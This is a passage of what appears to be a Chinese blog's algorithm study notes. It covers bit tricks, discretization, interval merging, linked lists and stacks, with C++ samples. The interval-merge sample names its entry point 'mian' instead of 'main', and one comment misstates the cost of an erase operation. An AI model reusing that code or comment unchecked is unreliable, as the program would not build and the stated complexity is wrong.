class="built_in">max</span>(res, i - j + <span class="number">1</span>);  <span class="comment">//返回最大值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="7、位运算"><a href="#7、位运算" class="headerlink" title="7、位运算"></a>7、位运算</h3><p>求n的第k项数字：n &gt;&gt; k &amp; 1</p><p>​    —— n的二进制表示中第k位是n</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107105953626.png" alt="image-20220107105953626"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">3</span>; k &gt;= <span class="number">0</span>; k --) cout &lt;&lt; (n &gt;&gt; k &amp; <span class="number">1</span>) &lt;&lt; endl;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 返回n的最后一位1： lowbit(n) = n &amp; -n</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107110725078.png" alt="image-20220107110725078"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107112330045.png" alt="image-20220107112330045"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107112527606.png" alt="image-20220107112527606"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) x -= <span class="built_in">lowbit</span>(x), res ++;   <span class="comment">//每次减去x的最后一位1</span></span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; res &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="8、离散化"><a href="#8、离散化" class="headerlink" title="8、离散化"></a>8、离散化</h3><p>这里特指整数保序的离散化</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108220342054.png" alt="image-20220108220342054"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108192729747.png" alt="image-20220108192729747"></p><p>问题</p><p>​    —— a[n]中有相同元素（<font color="red"><strong>去重</strong></font>）</p><p>​    —— 如何算出a[i]离散化后的值  – 二分</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108193017676.png" alt="image-20220108193017676"></p><p> 排完序后，下标就是其映射值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">300010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[N], s[N];         <span class="comment">//s[]为前缀和</span></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; alls;       <span class="comment">//存储（所有与插入和查询有关的）坐标</span></span><br><span class="line">vector&lt;PII&gt; add, query;     <span class="comment">//存储插入和询问操作的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用二分查找x所在的位置，此时是alls(x,l,r)排好序的,返回的坐标也会是按照x的大小所给出的；</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (alls[mid] &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r + <span class="number">1</span>;<span class="comment">//因为后续要使用前缀和，所以返回的坐标要加上1；</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x, c;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; c;</span><br><span class="line">        add.<span class="built_in">push_back</span>(&#123;x, c&#125;);</span><br><span class="line"></span><br><span class="line">        alls.<span class="built_in">push_back</span>(x);      <span class="comment">//我们要把下标x离散化，先把它加进待离散化的数组里去</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        query.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line"></span><br><span class="line">        alls.<span class="built_in">push_back</span>(l);  <span class="comment">//左右端点都需要离散化</span></span><br><span class="line">        alls.<span class="built_in">push_back</span>(r);<span class="comment">//查询的区间肯定要和加入时的点对应，都需要映射到一“空间”</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//去重</span></span><br><span class="line">   <span class="comment">// 将alls进行排序，并将重复的操作删除掉(如进行了两次在x的增值操作，应该去掉一个x保持平衡)；</span></span><br><span class="line">    <span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">    alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">//设it是一个迭代器，s.erase(it) 从s中删除迭代器it指向的元素，时间复杂度为O(logn)</span></span><br><span class="line">    <span class="comment">//unique“去除”相邻的重复元素，返回地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理插入</span></span><br><span class="line">    <span class="comment">//一个迭代器从1开始直到末尾结束，itdm.first是x，second是r(在上方循环中可知)；</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="built_in">find</span>(item.first);</span><br><span class="line">        a[x] += item.second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//预处理前缀和</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= alls.<span class="built_in">size</span>(); i ++) s[i] = s[i - <span class="number">1</span>] + a[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理询问</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : query)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="built_in">find</span>(item.first), r = <span class="built_in">find</span>(item.second);</span><br><span class="line">        <span class="comment">//find函数就是输入映射前的下标，返回在alls中的下标+1。</span></span><br><span class="line">        cout &lt;&lt; s[r] - s[l - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="9、区间合并"><a href="#9、区间合并" class="headerlink" title="9、区间合并"></a>9、区间合并</h3><p>有相同部分（包括端点）的多个区间合成一个长的区间</p><p>(1) 按区间左端点排序</p><p>(2) 扫描的过程中把所有可能有交集的区间合并</p><p>三种区间关系</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108223915885.png" alt="image-20220108223915885"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PII;     <span class="comment">//存储每个区间的两个端点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">vector&lt;PII&gt; segs;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;PII&gt; &amp;segs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;PII&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(segs.<span class="built_in">begin</span>(), segs.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> st = <span class="number">-2e9</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> seg : segs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ed &lt; seg.first)         <span class="comment">//没有交集</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line">            st = seg.first, ed = seg.second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> ed = <span class="built_in">max</span>(ed, seg.second);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);  <span class="comment">//防止空集</span></span><br><span class="line"></span><br><span class="line">    segs = res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        segs.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge</span>(segs);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; segs.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2、数据结构"><a href="#2、数据结构" class="headerlink" title="2、数据结构"></a>2、数据结构</h2><h3 id="1、链表与邻接表"><a href="#1、链表与邻接表" class="headerlink" title="1、链表与邻接表"></a>1、链表与邻接表</h3><p><strong>数组模拟单链表（邻接表用的最多——存储图和树）和双链表（优化）</strong></p><h4 id="1、单链表"><a href="#1、单链表" class="headerlink" title="1、单链表"></a>1、单链表</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110150833024.png" alt="image-20220110150833024"></p><p>链表的每一个节点都存储着自己的值和下一个位置的指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// head 表示头结点的下标</span></span><br><span class="line"><span class="comment">// e[i] 表示节点i的值</span></span><br><span class="line"><span class="comment">// ne[i] 表示节点i的next指针为多少</span></span><br><span class="line"><span class="comment">// idx 存储当前用到的点</span></span><br><span class="line"><span class="keyword">int</span> head, e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = <span class="number">-1</span>;  </span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将元素插入头节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_to_head</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head; <span class="comment">// 把插入元素指向头结点指向的元素</span></span><br><span class="line">    head = idx ++;     <span class="comment">// 将头结点的指针指向插入值,同时idx的值已经使用过了，所以向后移</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将x插入下标为K的点的后面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = ne[k];</span><br><span class="line">    ne[k] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将下标是k的下一点删掉</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ne[k] = ne[ne[k]];  <span class="comment">// 本来ne[k]指向i，再ne一遍就指向了i+1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    cin &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k, x;</span><br><span class="line">        <span class="keyword">char</span> op;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (op == <span class="string">&#x27;H&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x;</span><br><span class="line">            <span class="built_in">add_to_head</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; k;</span><br><span class="line">            <span class="keyword">if</span> (!k) head = ne[head];</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">remove</span>(k - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; k &gt;&gt; x;</span><br><span class="line">            <span class="built_in">add</span>(k - <span class="number">1</span>, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i != <span class="number">-1</span>; i = ne[i]) cout &lt;&lt; e[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PS-邻接表"><a href="#PS-邻接表" class="headerlink" title="PS: 邻接表"></a>PS: 邻接表</h4><p>把每个点的邻边存下来，是一堆单链表</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110161945018.png" alt="image-20220110161945018"></p><h4 id="2、双链表"><a href="#2、双链表" class="headerlink" title="2、双链表"></a>2、双链表</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110160249338.png" alt="image-20220110160249338"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="keyword">int</span> e[N], l[N], r[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 0表示左端点，1表示右端点</span></span><br><span class="line">    r[<span class="number">0</span>] = <span class="number">1</span>, l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在第k点右边插入x，左边就为add(l[k], x)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    r[idx] = r[k];  <span class="comment">// x的右指针就是原来k的右指针</span></span><br><span class="line">    l[idx] = k;</span><br><span class="line">    l[r[k]] = idx;  <span class="comment">// 先把左指针改了（因为要用到k的右指针表示）</span></span><br><span class="line">    r[k] = idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除第k个点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    r[l[k]] = r[k]; <span class="comment">// r[l[k]]，里面的l[k]指k左边那个数,r[]就是他的右指针</span></span><br><span class="line">    l[r[k]] = l[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、栈和队列"><a href="#2、栈和队列" class="headerlink" title="2、栈和队列"></a>2、栈和队列</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110162150009.png" alt="image-20220110162150009"></p><h4 id="1、栈"><a href="#1、栈" class="headerlink" title="1、栈"></a>1、栈</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tt 表示栈顶下标</span></span><br><span class="line"><span class="keyword">int</span> stk[N], tt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入     stk[++ tt] = x;</span></span><br><span class="line"><span class="comment">// 弹出     tt --;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    判断栈是否为空    </span></span><br><span class="line"><span class="comment">    if (tt &gt; 0) not empty;</span></span><br><span class="line"><span class="comment">    else empty;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//取出栈顶      stk[tt];</span></span><br></pre></td></tr></table></figure><h4 id="——单调栈"><a href="#——单调栈" class="headerlink" title="——单调栈"></a>——单调栈</h4><p>常见的应用场景：给定一个序列，求序列中的每一个数，左边离他最近的比他小的数在什么位置</p><figure class="highlight 